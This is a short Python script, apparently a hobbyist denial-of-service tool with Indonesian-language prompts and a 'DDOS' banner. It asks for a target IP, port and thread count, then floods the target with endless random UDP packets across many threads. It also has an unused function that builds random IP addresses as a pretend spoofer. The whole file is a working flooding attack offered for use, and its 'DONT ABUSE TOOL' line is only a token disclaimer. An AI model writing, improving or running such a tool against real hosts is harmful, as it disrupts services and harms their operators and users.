#!/usr/bin/env python3
import random
import socket
import time
import threading
import os, sys

os.system("clear")
print("""\033[91m
  ____  ____   ___  ____  
 |  _ \|  _ \ / _ \/ ___| 
 | | | | | | | | | \___ \ 
 | |_| | |_| | |_| |___) |
 |____/|____/ \___/|____/ 
                          \033[0m""")

print("\033[92mDONT ABUSE TOOL\033[0m")
time.sleep(2)
print("\033[95mKALO MAU REMAKE PM GUA\033[0m")
time.sleep(2)
print("\033[93mJOIN MY COMUNNITY\033[0m")
time.sleep(2)
print("\033[94mLINK COMUNNITY? PM GUA\033[0m")
time.sleep(2)
os.system("clear")
ip = str(input(" IP TARGET: "))
port = int(input(" PORT: "))
choice = str(input(" GAS DDOS?(y/n): "))
times = int(input(" Packet: "))
threads = int(input(" Isi Packet: "))
def run():
	data = random._urandom(777)
	i = random.choice(("[+]","[×]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PERMISI PAKET!!!")
		except:
			print("[×] WIBUU")

def spoofer():
  addr = [192, 168, 0, 1]
  d = '.'
  addr[0] = str(random.randrange(11, 197))
  addr[1] = str(random.randrange(0, 255))
  addr[2] = str(random.randrange(0, 255))
  addr[3] = str(random.randrange(2, 254))
  assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
  return assemebled
			
for y in range(threads):
	if choice == "y":
		th = threading.Thread(target = run)
		th.start()